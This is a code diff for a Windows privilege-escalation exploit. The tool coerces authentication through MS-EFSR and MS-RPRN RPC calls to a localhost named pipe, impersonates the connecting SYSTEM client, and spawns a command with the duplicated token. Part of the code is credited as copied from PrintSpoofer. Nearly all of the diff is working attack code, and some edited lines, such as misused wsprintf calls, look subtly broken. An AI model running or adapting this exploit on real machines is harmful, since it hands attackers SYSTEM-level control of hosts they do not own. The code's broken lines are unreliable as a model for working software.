@@ -48,7 +48,7 @@ wchar_t* generateRandomString() {
     return randomString;
 }
 
-void handleError(wstr function, long result) {
+void handleError(std::wstring function, long result) {
     wprintf(L"[error] %s returned (%d): %s\r\n", function, result, lookup_error_with_nameW(result));
 
     if (result == 53) {
@@ -80,29 +80,28 @@ BOOL createRPCbind(RPC_BINDING_HANDLE& binding_h)
         (RPC_WSTR)L"ncalrpc", // Protocol used 
         nullptr,              // Endpoint (NULL for dynamic binding)
         nullptr,              // UUID (NULL for dynamic binding)
-        nullptr,              // Options (utilisez nullptr pour les options par d�faut)
+        nullptr,              // Options (utilisez nullptr pour les options par defaut)
         &bindingString
     );
-
     if (status != RPC_S_OK) {
-        std::cerr << "[-] An error has occurred during the binding : " << status << std::endl;
+        handleError(L"RpcStringBindingCompose()", status);
         return FALSE;
     }
 
     status = RpcBindingFromStringBinding(bindingString, &binding_h);
-
     if (status != RPC_S_OK) {
-        std::cerr << "[-] An error has occurred during the binding : " << status << std::endl;
+        handleError(L"RpcBindingFromStringBinding()", status);
         RpcStringFree(&bindingString);
         return FALSE;
     }
-    status = RpcStringFree(&bindingString);
 
+    status = RpcStringFree(&bindingString);
     if (status != RPC_S_OK) {
-        std::cerr << "[-] An error has occurred during the binding : " << status << std::endl;
+        handleError(L"RpcStringFree()", status);
     }
+
     wprintf(L"[+] RPC binding with localhost done \r\n");
-    return TRUE;  // Success
+    return TRUE; // Success
 }
 
 // CODE STOLEN FROM https://github.com/itm4n/PrintSpoofer/blob/master/PrintSpoofer/PrintSpoofer.cpp
@@ -121,19 +120,19 @@ BOOL GetSystem(HANDLE hPipe)
 
     if (!ImpersonateNamedPipeClient(hPipe))
     {
-        wprintf(L"ImpersonateNamedPipeClient(). Error: %d\n", GetLastError());
+        handleError(L"ImpersonateNamedPipeClient()", GetLastError());
         goto cleanup;
     }
 
     if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken))
     {
-        wprintf(L"OpenThreadToken(). Error: %d\n", GetLastError());
+        handleError(L"OpenThreadToken()", GetLastError());
         goto cleanup;
     }
 
     if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
     {
-        wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
+        handleError(L"DuplicateTokenEx()", GetLastError());
         goto cleanup;
     }
 
@@ -141,7 +140,7 @@ BOOL GetSystem(HANDLE hPipe)
     {
         if (!SetTokenInformation(hSystemTokenDup, TokenSessionId, &g_dwSessionId, sizeof(DWORD)))
         {
-            wprintf(L"SetTokenInformation() failed. Error: %d\n", GetLastError());
+            handleError(L"SetTokenInformation()", GetLastError());
             goto cleanup;
         }
     }
@@ -154,13 +153,13 @@ BOOL GetSystem(HANDLE hPipe)
 
     if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
     {
-        wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
+        handleError(L"GetSystemDirectory()", GetLastError());
         goto cleanup;
     }
 
     if (!CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE))
     {
-        wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
+        handleError(L"CreateEnvironmentBlock()", GetLastError());
         goto cleanup;
     }
 
@@ -180,7 +179,7 @@ BOOL GetSystem(HANDLE hPipe)
             {
                 if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, g_pwszCommandLine, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
                 {
-                    wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
+                    handleError(L"CreateProcessWithTokenW()", GetLastError());
                     goto cleanup;
                 }
                 else
@@ -196,7 +195,7 @@ BOOL GetSystem(HANDLE hPipe)
         }
         else
         {
-            wprintf(L"CreateProcessAsUser() failed. Error: %d\n", GetLastError());
+            handleError(L"CreateProcessAsUser()", GetLastError());
             goto cleanup;
         }
     }
@@ -248,23 +247,23 @@ DWORD WINAPI launchNamedPipeServer(LPVOID lpParam) {
 
     if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
     {
-        wprintf(L"InitializeSecurityDescriptor() failed. Error: %d - ", GetLastError());
+        handleError(L"InitializeSecurityDescriptor()", GetLastError());
         return -1;
     }
 
     if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL))
     {
-        wprintf(L"ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d - ", GetLastError());
+        handleError(L"ConvertStringSecurityDescriptorToSecurityDescriptor()", GetLastError());
         return -1;
     }
 
     if ((hPipe = CreateNamedPipe(lpName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa)) != INVALID_HANDLE_VALUE)
     {
-        wprintf(L"[PIPESERVER] Named pipe '%ls' listening...\n\n", lpName);
+        wprintf(L"[PIPESERVER] Named pipe '%ls' listening ...\n\n", lpName);
         ConnectNamedPipe(hPipe, NULL);
         wprintf(L"\n[PIPESERVER] A client connected!\n\n");
         if (!GetSystem(hPipe)) {
-            wprintf(L"[PIPESERVER] CreateNamedPipe() failed. Error: %d - ", GetLastError());
+            handleError(L"[PIPESERVER] CreateNamedPipe()", GetLastError());
         }
     }
     return 0;
@@ -283,17 +282,17 @@ BOOL createNamedPipe(wchar_t* namedpipe, wchar_t* commandExecuted) {
 long CallEfsrFunctions(RPC_BINDING_HANDLE Binding, int exploitID, bool force, std::wstring randomNamedpipe)
 {
     long result;
-    wprintf(L"[MS-EFSR] [*] Attempting MS-EFSR functions...\r\n\n");
+    wprintf(L"[MS-EFSR] [*] Attempting MS-EFSR functions ...\r\n\n");
 
     LPWSTR targetedPipeName;
-    std::wstring chaine1 = L"\\\\127.0.0.1/pipe/";
+    std::wstring localhostUNCPathPipe = L"\\\\127.0.0.1/pipe/";
     std::wstring filename = L"\\C$\\\x00";
-    targetedPipeName = (LPWSTR)LocalAlloc(LPTR, (chaine1.length() + randomNamedpipe.length() + 1) * sizeof(wchar_t)); // Allouez la m�moire
+    targetedPipeName = (LPWSTR)LocalAlloc(LPTR, (localhostUNCPathPipe.length() + randomNamedpipe.length() + 1) * sizeof(wchar_t)); // Allouez la memoire
 
     if (targetedPipeName) {
-        StringCchCopy(targetedPipeName, chaine1.length() + randomNamedpipe.length() + filename.length() + 1, chaine1.c_str()); // Copiez la cha�ne chaine1
-        StringCchCat(targetedPipeName, chaine1.length() + randomNamedpipe.length() + filename.length() + 1, randomNamedpipe.c_str()); // Concat�nez la cha�ne randomNamedpipe
-        StringCchCat(targetedPipeName, chaine1.length() + randomNamedpipe.length() + filename.length() + 1, filename.c_str()); // Concat�nez la cha�ne randomNamedpipe
+        StringCchCopy(targetedPipeName, localhostUNCPathPipe.length() + randomNamedpipe.length() + filename.length() + 1, localhostUNCPathPipe.c_str()); // Copiez la chaine localhostUNCPathPipe
+        StringCchCat(targetedPipeName, localhostUNCPathPipe.length() + randomNamedpipe.length() + filename.length() + 1, randomNamedpipe.c_str()); // Concatenez la chaine randomNamedpipe
+        StringCchCat(targetedPipeName, localhostUNCPathPipe.length() + randomNamedpipe.length() + filename.length() + 1, filename.c_str()); // Concatenez la chaine randomNamedpipe
 
     }
 
@@ -313,14 +312,33 @@ long CallEfsrFunctions(RPC_BINDING_HANDLE Binding, int exploitID, bool force, st
         [&]() { return callEfsRpcEncryptFileExSrv(Binding, targetedPipeName); },
         [&]() { return callEfsRpcQueryProtectors(Binding, targetedPipeName); }
     };
+
+    std::wstring functionNames[] = {
+        L"EfsRpcOpenFileRaw",
+        L"EfsRpcEncryptFileSrv",
+        L"EfsRpcDecryptFileSrv",
+        L"EfsRpcQueryUsersOnFile",
+        L"EfsRpcQueryRecoveryAgents",
+        L"EfsRpcRemoveUsersFromFile",
+        L"EfsRpcAddUsersToFile",
+        L"EfsRpcFileKeyInfo",
+        L"EfsRpcDuplicateEncryptionInfoFile",
+        L"EfsRpcAddUsersToFileEx",
+        L"EfsRpcFileKeyInfoEx",
+        L"EfsRpcGetEncryptedFileMetadata",
+        L"EfsRpcEncryptFileExSrv",
+        L"EfsRpcQueryProtectors"
+    };
+
     int sizeOfFunctions = sizeof(functions) / sizeof(functions[0]);
     if (exploitID == -1) {
-        wprintf(L"[MS-EFSR] Starting RPC functions fuzzing...\r\n");
+        wprintf(L"[MS-EFSR] Starting RPC functions fuzzing ...\r\n");
         for (int i = 0; i < sizeOfFunctions; i++) {
             wprintf(L" [MS-EFSR] ");
             result = functions[i]();
-            wprintf(L" [MS-EFSR] ");
-            handleError(result);
+
+            handleError(wsprintf("%s%s", L" [MS-EFSR] ", functionNames[i]), result);
+
             if (result == 53 and !force) {
                 LocalFree(targetedPipeName);
                 return 0;
@@ -330,8 +348,7 @@ long CallEfsrFunctions(RPC_BINDING_HANDLE Binding, int exploitID, bool force, st
     else {
         wprintf(L"[MS-EFSR] ");
         result = functions[exploitID]();
-        wprintf(L"[MS-EFSR] ");
-        handleError(result);
+        handleError(wsprintf("%s%s", L" [MS-EFSR] ", functionNames[exploitID]), result);
     }
 
     LocalFree(targetedPipeName);
@@ -341,28 +358,35 @@ long CallEfsrFunctions(RPC_BINDING_HANDLE Binding, int exploitID, bool force, st
 
 long callRprnFunctions(int exploitID, bool force, std::wstring randomNamedpipe) {
     long result;
-    wprintf(L"[MS-RPRN] [*] Attempting MS-RPRN functions...\r\n\n");
+    wprintf(L"[MS-RPRN] [*] Attempting MS-RPRN functions ...\r\n\n");
     LPWSTR targetedPipeName;
-    std::wstring chaine1 = L"\\\\127.0.0.1/pipe/";
-    targetedPipeName = (LPWSTR)LocalAlloc(LPTR, (chaine1.length() + randomNamedpipe.length() + 1) * sizeof(wchar_t));
+    std::wstring localhostUNCPathPipe = L"\\\\127.0.0.1/pipe/";
+    targetedPipeName = (LPWSTR)LocalAlloc(LPTR, (localhostUNCPathPipe.length() + randomNamedpipe.length() + 1) * sizeof(wchar_t));
 
     if (targetedPipeName) {
-        StringCchCopy(targetedPipeName, chaine1.length() + randomNamedpipe.length() + 1, chaine1.c_str());
-        StringCchCat(targetedPipeName, chaine1.length() + randomNamedpipe.length() + 1, randomNamedpipe.c_str());
+        StringCchCopy(targetedPipeName, localhostUNCPathPipe.length() + randomNamedpipe.length() + 1, localhostUNCPathPipe.c_str());
+        StringCchCat(targetedPipeName, localhostUNCPathPipe.length() + randomNamedpipe.length() + 1, randomNamedpipe.c_str());
     }
 
     std::function<int()> functions[] = {
         [&]() { return callRpcRemoteFindFirstPrinterChangeNotificationEx(targetedPipeName); },
         [&]() { return callRpcRemoteFindFirstPrinterChangeNotification(targetedPipeName);
     } };
+
+    std::wstring functionNames[] = {
+        L"RpcRemoteFindFirstPrinterChangeNotificationEx",
+        L"RpcRemoteFindFirstPrinterChangeNotification"
+    };
+
     int sizeOfFunctions = sizeof(functions) / sizeof(functions[0]);
     if (exploitID == -1) {
-        wprintf(L"[MS-RPRN] Starting RPC functions fuzzing...\r\n");
+        wprintf(L"[MS-RPRN] Starting RPC functions fuzzing ...\r\n");
         for (int i = 0; i < sizeOfFunctions; i++) {
             wprintf(L" [MS-RPRN] ");
             result = functions[i]();
-            wprintf(L" [MS-RPRN] ");
-            handleError(result);
+
+            handleError(wsprintf("%s%s", L" [MS-RPRN] ", functionNames[i]), result);
+
             if (result == 0 and !force) {
                 LocalFree(targetedPipeName);
                 return 0;
@@ -372,13 +396,12 @@ long callRprnFunctions(int exploitID, bool force, std::wstring randomNamedpipe) 
     else {
         wprintf(L"[MS-RPRN] ");
         result = functions[exploitID]();
-        wprintf(L"[MS-RPRN] ");
-        handleError(result);
+        handleError(wsprintf("%s%s", L" [MS-RPRN] ", functionNames[exploitID]), result);
     }
 
     LocalFree(targetedPipeName);
     if (!force) {
-        wprintf(L"[MS-RPRN] None of MS-RPRN worked... \r\n\n\n");
+        wprintf(L"[MS-RPRN] None of MS-RPRN functions worked ... \r\n\n\n");
     }
     return -1;
 }
@@ -393,6 +416,7 @@ BOOL exploitMsEfsr(wchar_t* command, int exploitId, bool force, std::wstring ran
 
     if (!createNamedPipe(namedpipe, command)) {
         wprintf(L"[PIPESERVER] An error has occurred while creating the pipe server\r\n");
+        handleError(L" [PIPESERVER] createNamedPipe()", GetLastError());
         return FALSE;
     }
 
@@ -401,6 +425,7 @@ BOOL exploitMsEfsr(wchar_t* command, int exploitId, bool force, std::wstring ran
     handle_t RPCBind;
     if (!createRPCbind(RPCBind)) {
         wprintf(L"[RPCBIND] An error has occurred during the RPC binding \r\n");
+        handleError(L" [RPCBIND] createRPCbind()", GetLastError());
         return FALSE;
     }
     Sleep(500);
@@ -416,10 +441,9 @@ BOOL exploitMsRprn(wchar_t* command, int exploitId, bool force, std::wstring ran
     StringCchCat(namedpipe, MAX_PATH, randomNamedpipe.c_str());
     StringCchCat(namedpipe, MAX_PATH, L"\\pipe\\spoolss");
 
-
-
     if (!createNamedPipe(namedpipe, command)) {
         wprintf(L"[PIPESERVER] An error has occurred while creating the pipe server\r\n");
+        handleError(L" [PIPESERVER] createNamedPipe()", GetLastError());
         return FALSE;
     }
     Sleep(500);
